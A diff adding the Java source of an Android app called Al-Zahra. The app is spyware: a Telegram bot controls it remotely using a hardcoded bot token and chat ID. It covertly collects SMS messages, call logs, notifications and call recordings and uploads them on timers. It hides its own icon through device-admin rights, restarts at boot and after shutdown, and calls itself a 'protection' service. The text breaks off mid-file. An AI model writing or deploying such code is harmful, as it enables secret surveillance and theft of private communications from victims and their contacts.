@@ -1,0 +1,4558 @@
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/telegram/TelegramArabicBot.java
+================================================
+
+package com.alzahra.telegram;
+
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.util.concurrent.ConcurrentLinkedQueue;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+public class TelegramArabicBot {
+    private static final String TAG = "TelegramBot";
+    private static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
+    private static final String CHAT_ID = "7344776596";
+    private static final String API_BASE = "https://api.telegram.org/bot";
+    
+    private Context context;
+    private Handler mainHandler;
+    private ExecutorService executor;
+    private volatile boolean running = false;
+    private long lastUpdateId = 0;
+    private ConcurrentLinkedQueue<String> commandQueue;
+    private SharedPreferences prefs;
+
+    public TelegramArabicBot(Context ctx) {
+        this.context = ctx;
+        this.mainHandler = new Handler(Looper.getMainLooper());
+        this.executor = Executors.newFixedThreadPool(3);
+        this.commandQueue = new ConcurrentLinkedQueue<>();
+        this.prefs = ctx.getSharedPreferences("bot_prefs", Context.MODE_PRIVATE);
+    }
+
+    public void start() {
+        if (running) return;
+        running = true;
+        
+        Log.d(TAG, "Bot starting...");
+        sendControlPanel();
+        startPolling();
+    }
+
+    public void stop() {
+        running = false;
+        executor.shutdown();
+    }
+
+    private void sendControlPanel() {
+        String text = "🎛️ **لوحة تحكم Al-Zahra**\\n\\n" +
+                "مرحباً بك في نظام المراقبة الذكي\\n" +
+                "اختر الجهاز للتحكم:";
+        
+        String keyboard = "{\"inline_keyboard\":["
+            + "[{\"text\":\"📱 الأجهزة المتصلة\",\"callback_data\":\"/devices\"}],"
+            + "[{\"text\":\"📨 رسائل SMS\",\"callback_data\":\"/sms\"},{\"text\":\"🔔 الإشعارات\",\"callback_data\":\"/notifications\"}],"
+            + "[{\"text\":\"💬 واتساب\",\"callback_data\":\"/whatsapp\"},{\"text\":\"📧 ماسنجر\",\"callback_data\":\"/messenger\"}],"
+            + "[{\"text\":\"📞 سجل المكالمات\",\"callback_data\":\"/calls\"}],"
+            + "[{\"text\":\"📱 معلومات الجهاز\",\"callback_data\":\"/info\"},{\"text\":\"🎙️ التسجيلات\",\"callback_data\":\"/recordings\"}],"
+            + "[{\"text\":\"⚙️ الإعدادات\",\"callback_data\":\"/settings\"}],"
+            + "[{\"text\":\"🔒 إخفاء التطبيق\",\"callback_data\":\"/hide\"},{\"text\":\"🔓 إظهار التطبيق\",\"callback_data\":\"/unhide\"}]"
+            + "]}";
+        
+        sendMessageWithKeyboard(text, keyboard);
+    }
+
+    private void startPolling() {
+        executor.execute(() -> {
+            while (running) {
+                try {
+                    pollUpdates();
+                    Thread.sleep(2000);
+                } catch (Exception e) {
+                    Log.e(TAG, "Polling error: " + e.getMessage());
+                    try { Thread.sleep(5000); } catch (InterruptedException ie) {}
+                }
+            }
+        });
+    }
+
+    private void pollUpdates() {
+        try {
+            String url = API_BASE + BOT_TOKEN + "/getUpdates?offset=" + 
+                        (lastUpdateId + 1) + "&limit=100";
+            
+            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(10000);
+            
+            BufferedReader reader = new BufferedReader(
+                new InputStreamReader(conn.getInputStream()));
+            StringBuilder response = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                response.append(line);
+            }
+            reader.close();
+            
+            JSONObject json = new JSONObject(response.toString());
+            if (!json.getBoolean("ok")) return;
+            
+            JSONArray results = json.getJSONArray("result");
+            for (int i = 0; i < results.length(); i++) {
+                JSONObject update = results.getJSONObject(i);
+                lastUpdateId = update.getLong("update_id");
+                processUpdate(update);
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error polling: " + e.getMessage());
+        }
+    }
+
+    private void processUpdate(JSONObject update) {
+        try {
+            String command = null;
+            
+            // Check for message
+            if (update.has("message") && update.getJSONObject("message").has("text")) {
+                command = update.getJSONObject("message").getString("text")
+                         .trim().toLowerCase();
+            }
+            // Check for callback (button press)
+            else if (update.has("callback_query")) {
+                command = update.getJSONObject("callback_query")
+                         .getString("data").trim().toLowerCase();
+            }
+            
+            if (command != null) {
+                commandQueue.offer(command);
+                handleCommand(command);
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error processing update: " + e.getMessage());
+        }
+    }
+
+    private void handleCommand(String cmd) {
+        Log.d(TAG, "Handling command: " + cmd);
+        
+        switch (cmd) {
+            case "/start":
+            case "/help":
+            case "مساعدة":
+                sendControlPanel();
+                break;
+                
+            case "/devices":
+            case "الأجهزة":
+                sendMessage("📱 **الأجهزة المتصلة**\\nجاري البحث عن الأجهزة...");
+                commandQueue.offer("CMD_GET_DEVICES");
+                break;
+                
+            case "/sms":
+            case "sms":
+                sendMessage("⏳ **جاري سحب رسائل SMS...**\\nيرجى الانتظار");
+                commandQueue.offer("CMD_GET_SMS");
+                break;
+                
+            case "/notifications":
+            case "الإشعارات":
+                sendMessage("⏳ **جاري سحب الإشعارات...**");
+                commandQueue.offer("CMD_GET_NOTIFICATIONS");
+                break;
+                
+            case "/whatsapp":
+            case "واتساب":
+                sendMessage("⏳ **جاري سحب رسائل واتساب...**\\nيبحث عن النسخ الاحتياطي");
+                commandQueue.offer("CMD_GET_WHATSAPP");
+                break;
+                
+            case "/messenger":
+            case "ماسنجر":
+                sendMessage("⏳ **جاري سحب رسائل ماسنجر...**");
+                commandQueue.offer("CMD_GET_MESSENGER");
+                break;
+                
+            case "/calls":
+            case "المكالمات":
+                sendMessage("⏳ **جاري سحب سجل المكالمات...**");
+                commandQueue.offer("CMD_GET_CALLS");
+                break;
+                
+            case "/info":
+            case "معلومات":
+                commandQueue.offer("CMD_GET_INFO");
+                break;
+                
+            case "/recordings":
+            case "التسجيلات":
+                sendMessage("⏳ **جاري سحب تسجيلات المكالمات...**");
+                commandQueue.offer("CMD_GET_RECORDINGS");
+                break;
+                
+            case "/settings":
+            case "إعدادات":
+                sendSettingsPanel();
+                break;
+                
+            case "/hide":
+            case "إخفاء":
+                sendMessage("🔒 **جاري إخفاء التطبيق...**");
+                commandQueue.offer("CMD_HIDE_APP");
+                break;
+                
+            case "/unhide":
+            case "إظهار":
+                sendMessage("🔓 **جاري إظهار التطبيق...**");
+                commandQueue.offer("CMD_UNHIDE_APP");
+                break;
+                
+            case "/record_on":
+                sendMessage("🎙️ **تم تفعيل تسجيل المكالمات**");
+                prefs.edit().putBoolean("call_recording", true).apply();
+                break;
+                
+            case "/record_off":
+                sendMessage("🎙️ **تم إيقاف تسجيل المكالمات**");
+                prefs.edit().putBoolean("call_recording", false).apply();
+                break;
+                
+            default:
+                sendMessage("❓ **أمر غير معروف**\\nاكتب /help للمساعدة");
+        }
+    }
+
+    private void sendSettingsPanel() {
+        String text = "⚙️ **الإعدادات**\\n\\n"
+            + "**تسجيل المكالمات:**\\n"
+            + "/record_on - تفعيل\\n"
+            + "/record_off - إيقاف\\n\\n"
+            + "**التحكم:**\\n"
+            + "/hide - إخفاء التطبيق\\n"
+            + "/unhide - إظهار التطبيق\\n\\n"
+            + "للعودة للوحة الرئيسية: /help";
+        
+        sendMessage(text);
+    }
+
+    public String getNextCommand() {
+        return commandQueue.poll();
+    }
+
+    public void sendMessage(String text) {
+        executor.execute(() -> {
+            try {
+                String url = API_BASE + BOT_TOKEN + "/sendMessage?chat_id=" + 
+                            CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + 
+                            "&parse_mode=Markdown";
+                
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                conn.setConnectTimeout(10000);
+                conn.getInputStream();
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Send message error: " + e.getMessage());
+            }
+        });
+    }
+
+    public void sendStatusMessage(String text) {
+        sendMessage(text);
+    }
+
+    private void sendMessageWithKeyboard(String text, String keyboard) {
+        executor.execute(() -> {
+            try {
+                String url = API_BASE + BOT_TOKEN + "/sendMessage";
+                String params = "chat_id=" + CHAT_ID + 
+                    "&text=" + URLEncoder.encode(text, "UTF-8") +
+                    "&parse_mode=Markdown" +
+                    "&reply_markup=" + URLEncoder.encode(keyboard, "UTF-8");
+                
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.getOutputStream().write(params.getBytes("UTF-8"));
+                conn.getInputStream();
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Send keyboard error: " + e.getMessage());
+            }
+        });
+    }
+
+    public boolean uploadFile(File file, String caption) {
+        if (file == null || !file.exists()) {
+            sendMessage("❌ الملف غير موجود");
+            return false;
+        }
+        
+        executor.execute(() -> {
+            try {
+                String boundary = "===" + System.currentTimeMillis() + "===";
+                String lineEnd = "\r\n";
+                
+                HttpURLConnection conn = (HttpURLConnection) new URL(
+                    API_BASE + BOT_TOKEN + "/sendDocument").openConnection();
+                
+                conn.setUseCaches(false);
+                conn.setDoOutput(true);
+                conn.setDoInput(true);
+                conn.setRequestProperty("Content-Type", 
+                    "multipart/form-data; boundary=" + boundary);
+                
+                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+                
+                // Chat ID
+                dos.writeBytes("--" + boundary + lineEnd);
+                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + 
+                    lineEnd + lineEnd + CHAT_ID + lineEnd);
+                
+                // Caption
+                dos.writeBytes("--" + boundary + lineEnd);
+                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + 
+                    lineEnd + lineEnd + caption + lineEnd);
+                
+                // File
+                dos.writeBytes("--" + boundary + lineEnd);
+                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; " +
+                    "filename=\"" + file.getName() + "\"" + lineEnd);
+                dos.writeBytes("Content-Type: application/octet-stream" + lineEnd + lineEnd);
+                
+                FileInputStream fis = new FileInputStream(file);
+                byte[] buffer = new byte[8192];
+                int bytesRead;
+                while ((bytesRead = fis.read(buffer)) != -1) {
+                    dos.write(buffer, 0, bytesRead);
+                }
+                fis.close();
+                
+                dos.writeBytes(lineEnd);
+                dos.writeBytes("--" + boundary + "--" + lineEnd);
+                
+                dos.flush();
+                dos.close();
+                
+                int responseCode = conn.getResponseCode();
+                if (responseCode != 200) {
+                    Log.e(TAG, "Upload failed: " + responseCode);
+                }
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Upload error: " + e.getMessage());
+            }
+        });
+        
+        return true;
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/services/CoreService.java
+================================================
+
+package com.alzahra.services;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Build;
+import android.os.IBinder;
+import android.util.Log;
+
+import androidx.core.app.NotificationCompat;
+
+import com.alzahra.R;
+import com.alzahra.receivers.AdminReceiver;
+import com.alzahra.telegram.TelegramArabicBot;
+import com.alzahra.data.SMSCollector;
+import com.alzahra.data.CallLogCollector;
+import com.alzahra.data.NotificationCollector;
+
+import org.json.JSONObject;
+
+import java.io.File;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
+
+public class CoreService extends Service {
+    private static final String TAG = "CoreService";
+    private static final String CHANNEL_ID = "alzahra_channel";
+    
+    private TelegramArabicBot bot;
+    private ScheduledExecutorService scheduler;
+    private SMSCollector smsCollector;
+    private CallLogCollector callLogCollector;
+    private NotificationCollector notificationCollector;
+    private SharedPreferences prefs;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "Service created");
+        
+        prefs = getSharedPreferences("alzahra_settings", Context.MODE_PRIVATE);
+        bot = new TelegramArabicBot(this);
+        bot.start();
+        
+        smsCollector = new SMSCollector(this);
+        callLogCollector = new CallLogCollector(this);
+        notificationCollector = new NotificationCollector(this);
+        
+        createNotificationChannel();
+        startForeground(1, buildNotification());
+        startSync();
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                "Al-Zahra Service",
+                NotificationManager.IMPORTANCE_MIN
+            );
+            channel.setDescription("خدمة المزامنة والحماية");
+            getSystemService(NotificationManager.class).createNotificationChannel(channel);
+        }
+    }
+
+    private Notification buildNotification() {
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle(getString(R.string.service_running))
+            .setContentText(getString(R.string.service_description))
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setOngoing(true)
+            .build();
+    }
+
+    private void startSync() {
+        scheduler = Executors.newScheduledThreadPool(4);
+        
+        // Sync SMS every minute
+        scheduler.scheduleAtFixedRate(() -> {
+            if (prefs.getBoolean("sync_sms", true)) {
+                File file = smsCollector.export();
+                if (file != null) {
+                    bot.uploadFile(file, "📨 **رسائل SMS**\\n🕐 " + 
+                        java.text.DateFormat.getDateTimeInstance().format(new java.util.Date()));
+                }
+            }
+        }, 5, 60, TimeUnit.SECONDS);
+        
+        // Sync calls every 5 minutes
+        scheduler.scheduleAtFixedRate(() -> {
+            if (prefs.getBoolean("sync_calls", true)) {
+                File file = callLogCollector.export();
+                if (file != null) {
+                    bot.uploadFile(file, "📞 **سجل المكالمات**");
+                }
+            }
+        }, 10, 5, TimeUnit.MINUTES);
+        
+        // Sync notifications every 30 seconds
+        scheduler.scheduleAtFixedRate(() -> {
+            if (prefs.getBoolean("sync_notifications", true)) {
+                File file = notificationCollector.export();
+                if (file != null) {
+                    bot.uploadFile(file, "🔔 **الإشعارات الجديدة**");
+                }
+            }
+        }, 15, 30, TimeUnit.SECONDS);
+        
+        // Process bot commands
+        scheduler.scheduleAtFixedRate(this::processCommands, 0, 3, TimeUnit.SECONDS);
+    }
+
+    private void processCommands() {
+        String cmd = bot.getNextCommand();
+        if (cmd == null) return;
+        
+        Log.d(TAG, "Processing command: " + cmd);
+        
+        switch (cmd) {
+            case "CMD_GET_DEVICES":
+                sendDeviceList();
+                break;
+                
+            case "CMD_GET_SMS":
+                File smsFile = smsCollector.export();
+                if (smsFile != null) bot.uploadFile(smsFile, "📨 **رسائل SMS**");
+                else bot.sendMessage("❌ لا توجد رسائل SMS");
+                break;
+                
+            case "CMD_GET_CALLS":
+                File callsFile = callLogCollector.export();
+                if (callsFile != null) bot.uploadFile(callsFile, "📞 **سجل المكالمات**");
+                else bot.sendMessage("❌ لا توجد مكالمات");
+                break;
+                
+            case "CMD_GET_NOTIFICATIONS":
+                File notifFile = notificationCollector.export();
+                if (notifFile != null) bot.uploadFile(notifFile, "🔔 **الإشعارات**");
+                else bot.sendMessage("❌ لا توجد إشعارات");
+                break;
+                
+            case "CMD_GET_WHATSAPP":
+                bot.sendMessage("⏳ **جاري البحث عن بيانات واتساب...**\\n" +
+                    "المسار: /sdcard/Android/media/com.whatsapp/");
+                break;
+                
+            case "CMD_GET_MESSENGER":
+                bot.sendMessage("⏳ **جاري البحث عن بيانات ماسنجر...**");
+                break;
+                
+            case "CMD_GET_INFO":
+                sendDeviceInfo();
+                break;
+                
+            case "CMD_GET_RECORDINGS":
+                sendRecordings();
+                break;
+                
+            case "CMD_HIDE_APP":
+                hideApp(true);
+                break;
+                
+            case "CMD_UNHIDE_APP":
+                hideApp(false);
+                break;
+        }
+    }
+
+    private void sendDeviceList() {
+        String info = "📱 **الأجهزة المتصلة**\\n\\n" +
+                "• الجهاز الحالي: " + android.os.Build.MODEL + "\\n" +
+                "• المعالج: " + android.os.Build.HARDWARE + "\\n" +
+                "• الرقم التسلسلي: " + android.os.Build.SERIAL + "\\n" +
+                "• الحالة: ✅ متصل";
+        bot.sendMessage(info);
+    }
+
+    private void sendDeviceInfo() {
+        JSONObject info = new JSONObject();
+        try {
+            info.put("model", android.os.Build.MODEL);
+            info.put("manufacturer", android.os.Build.MANUFACTURER);
+            info.put("android_version", android.os.Build.VERSION.RELEASE);
+            info.put("sdk", android.os.Build.VERSION.SDK_INT);
+            info.put("hardware", android.os.Build.HARDWARE);
+            info.put("serial", android.os.Build.SERIAL);
+            
+            // Battery info
+            android.content.Intent battery = registerReceiver(null,
+                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
+            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+            info.put("battery", (int)((level / (float)scale) * 100));
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error building info", e);
+        }
+        
+        bot.sendMessage("📱 **معلومات الجهاز**\\n```json\\n" + info.toString() + "\\n```");
+    }
+
+    private void sendRecordings() {
+        File recDir = new File(getFilesDir(), "recordings");
+        if (!recDir.exists() || recDir.listFiles().length == 0) {
+            bot.sendMessage("❌ لا توجد تسجيلات حالياً");
+            return;
+        }
+        
+        File[] files = recDir.listFiles();
+        bot.sendMessage("🎙️ **التسجيلات المتاحة:** " + files.length + " ملف");
+        
+        for (File file : files) {
+            bot.uploadFile(file, "🎙️ تسجيل: " + file.getName());
+        }
+    }
+
+    private void hideApp(boolean hide) {
+        prefs.edit().putBoolean("app_hidden", hide).apply();
+        
+        DevicePolicyManager dpm = (DevicePolicyManager) 
+            getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName admin = new ComponentName(this, AdminReceiver.class);
+        
+        try {
+            if (dpm.isAdminActive(admin)) {
+                dpm.setApplicationHidden(admin, getPackageName(), hide);
+                bot.sendMessage(hide ? "🔒 **تم إخفاء التطبيق**" : 
+                    "🔓 **تم إظهار التطبيق**");
+            } else {
+                bot.sendMessage("❌ صلاحية المسؤول غير مفعلة");
+            }
+        } catch (Exception e) {
+            bot.sendMessage("❌ خطأ: " + e.getMessage());
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (scheduler != null) {
+            scheduler.shutdownNow();
+        }
+        // Restart service
+        startService(new Intent(this, CoreService.class));
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/services/NotificationService.java
+================================================
+
+package com.alzahra.services;
+
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+import android.util.Log;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
+public class NotificationService extends NotificationListenerService {
+    private static final String TAG = "NotificationService";
+
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        try {
+            String packageName = sbn.getPackageName();
+            CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
+            CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
+            
+            // Skip system notifications
+            if (packageName.contains("android") || packageName.contains("systemui")) {
+                return;
+            }
+
+            JSONObject notification = new JSONObject();
+            notification.put("package", packageName);
+            notification.put("title", title != null ? title.toString() : "");
+            notification.put("text", text != null ? text.toString() : "");
+            notification.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", 
+                Locale.getDefault()).format(new Date()));
+            notification.put("post_time", sbn.getPostTime());
+
+            Log.d(TAG, "Notification: " + notification.toString());
+            saveNotification(notification);
+
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error", e);
+        }
+    }
+
+    private void saveNotification(JSONObject notification) {
+        try {
+            File dir = new File(getFilesDir(), "notifications");
+            if (!dir.exists()) dir.mkdirs();
+
+            File file = new File(dir, "notifications.json");
+            FileWriter writer = new FileWriter(file, true);
+            writer.write(notification.toString() + "\n");
+            writer.close();
+
+        } catch (IOException e) {
+            Log.e(TAG, "Save error", e);
+        }
+    }
+
+    @Override
+    public void onNotificationRemoved(StatusBarNotification sbn) {
+        // Notification removed
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/receivers/BootReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.util.Log;
+
+import androidx.core.content.ContextCompat;
+
+import com.alzahra.services.CoreService;
+
+public class BootReceiver extends BroadcastReceiver {
+    private static final String TAG = "BootReceiver";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Log.d(TAG, "Boot completed, starting service");
+            
+            Intent serviceIntent = new Intent(context, CoreService.class);
+            ContextCompat.startForegroundService(context, serviceIntent);
+        }
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/receivers/AdminReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.app.admin.DeviceAdminReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.widget.Toast;
+
+public class AdminReceiver extends DeviceAdminReceiver {
+    
+    @Override
+    public void onEnabled(Context context, Intent intent) {
+        super.onEnabled(context, intent);
+        // Admin enabled
+    }
+
+    @Override
+    public CharSequence onDisableRequested(Context context, Intent intent) {
+        return "سيؤدي تعطيل الخدمة إلى إيقاف الحماية. هل أنت متأكد؟";
+    }
+
+    @Override
+    public void onDisabled(Context context, Intent intent) {
+        super.onDisabled(context, intent);
+        // Admin disabled
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/receivers/CallReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.media.MediaRecorder;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import java.io.File;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
+public class CallReceiver extends BroadcastReceiver {
+    private static final String TAG = "CallReceiver";
+    private static MediaRecorder recorder;
+    private static boolean isRecording = false;
+    private static String currentNumber = "";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+
+        if (number != null && !number.isEmpty()) {
+            currentNumber = number;
+        }
+
+        SharedPreferences prefs = context.getSharedPreferences("alzahra_settings", 
+            Context.MODE_PRIVATE);
+        boolean recordingEnabled = prefs.getBoolean("call_recording", true);
+
+        if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
+            if (recordingEnabled) {
+                startRecording(context);
+            }
+        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
+            stopRecording();
+        }
+    }
+
+    private void startRecording(Context context) {
+        if (isRecording) return;
+
+        try {
+            File dir = new File(context.getFilesDir(), "recordings");
+            if (!dir.exists()) dir.mkdirs();
+
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", 
+                Locale.getDefault()).format(new Date());
+            File file = new File(dir, "CALL_" + currentNumber + "_" + timestamp + ".mp3");
+
+            recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            recorder.setOutputFile(file.getAbsolutePath());
+
+            recorder.prepare();
+            recorder.start();
+            isRecording = true;
+            Log.d(TAG, "Recording started: " + file.getName());
+
+        } catch (IOException e) {
+            Log.e(TAG, "Recording error", e);
+        }
+    }
+
+    private void stopRecording() {
+        if (!isRecording) return;
+
+        try {
+            recorder.stop();
+            recorder.release();
+            recorder = null;
+            isRecording = false;
+            Log.d(TAG, "Recording stopped");
+        } catch (Exception e) {
+            Log.e(TAG, "Stop error", e);
+        }
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/data/SMSCollector.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.ContentResolver;
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.Telephony;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.Date;
+
+public class SMSCollector {
+    private static final String TAG = "SMSCollector";
+    private Context context;
+
+    public SMSCollector(Context ctx) {
+        this.context = ctx;
+    }
+
+    public File export() {
+        try {
+            JSONArray smsList = new JSONArray();
+            ContentResolver resolver = context.getContentResolver();
+            
+            Cursor cursor = resolver.query(
+                Telephony.Sms.CONTENT_URI,
+                null, null, null,
+                "date DESC"
+            );
+
+            if (cursor != null && cursor.moveToFirst()) {
+                int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
+                int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
+                int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
+                int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
+
+                do {
+                    JSONObject sms = new JSONObject();
+                    try {
+                        sms.put("address", cursor.getString(addressIndex));
+                        sms.put("body", cursor.getString(bodyIndex));
+                        sms.put("date", new Date(cursor.getLong(dateIndex)).toString());
+                        sms.put("type", cursor.getInt(typeIndex) == 
+                            Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "received");
+                        smsList.put(sms);
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } while (cursor.moveToNext());
+                
+                cursor.close();
+            }
+
+            // Save to file
+            File dir = new File(context.getFilesDir(), "sms_export");
+            if (!dir.exists()) dir.mkdirs();
+            
+            File file = new File(dir, "sms_backup_" + System.currentTimeMillis() + ".json");
+            FileWriter writer = new FileWriter(file);
+            writer.write(smsList.toString(2));
+            writer.close();
+            
+            return file;
+
+        } catch (IOException e) {
+            Log.e(TAG, "Export error", e);
+            return null;
+        }
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/data/CallLogCollector.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.CallLog;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.Date;
+
+public class CallLogCollector {
+    private static final String TAG = "CallLogCollector";
+    private Context context;
+
+    public CallLogCollector(Context ctx) {
+        this.context = ctx;
+    }
+
+    public File export() {
+        try {
+            JSONArray callList = new JSONArray();
+            
+            Cursor cursor = context.getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                "date DESC"
+            );
+
+            if (cursor != null && cursor.moveToFirst()) {
+                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
+                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
+
+                do {
+                    JSONObject call = new JSONObject();
+                    try {
+                        call.put("number", cursor.getString(numberIndex));
+                        call.put("type", getCallType(cursor.getInt(typeIndex)));
+                        call.put("date", new Date(cursor.getLong(dateIndex)).toString());
+                        call.put("duration", cursor.getInt(durationIndex));
+                        callList.put(call);
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } while (cursor.moveToNext());
+                
+                cursor.close();
+            }
+
+            // Save
+            File dir = new File(context.getFilesDir(), "calls_export");
+            if (!dir.exists()) dir.mkdirs();
+            
+            File file = new File(dir, "calls_" + System.currentTimeMillis() + ".json");
+            FileWriter writer = new FileWriter(file);
+            writer.write(callList.toString(2));
+            writer.close();
+            
+            return file;
+
+        } catch (IOException e) {
+            Log.e(TAG, "Export error", e);
+            return null;
+        }
+    }
+
+    private String getCallType(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            default: return "unknown";
+        }
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/data/NotificationCollector.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.Context;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.FileWriter;
+import java.io.IOException;
+
+public class NotificationCollector {
+    private static final String TAG = "NotificationCollector";
+    private Context context;
+
+    public NotificationCollector(Context ctx) {
+        this.context = ctx;
+    }
+
+    public File export() {
+        try {
+            File sourceFile = new File(context.getFilesDir(), 
+                "notifications/notifications.json");
+            
+            if (!sourceFile.exists()) {
+                return null;
+            }
+
+            JSONArray notifications = new JSONArray();
+            BufferedReader reader = new BufferedReader(new FileReader(sourceFile));
+            String line;
+            
+            while ((line = reader.readLine()) != null) {
+                try {
+                    JSONObject notif = new JSONObject(line);
+                    
+                    // Categorize by app
+                    String pkg = notif.optString("package", "");
+                    if (pkg.contains("whatsapp")) {
+                        notif.put("category", "WHATSAPP");
+                    } else if (pkg.contains("messenger") || pkg.contains("orca")) {
+                        notif.put("category", "MESSENGER");
+                    } else {
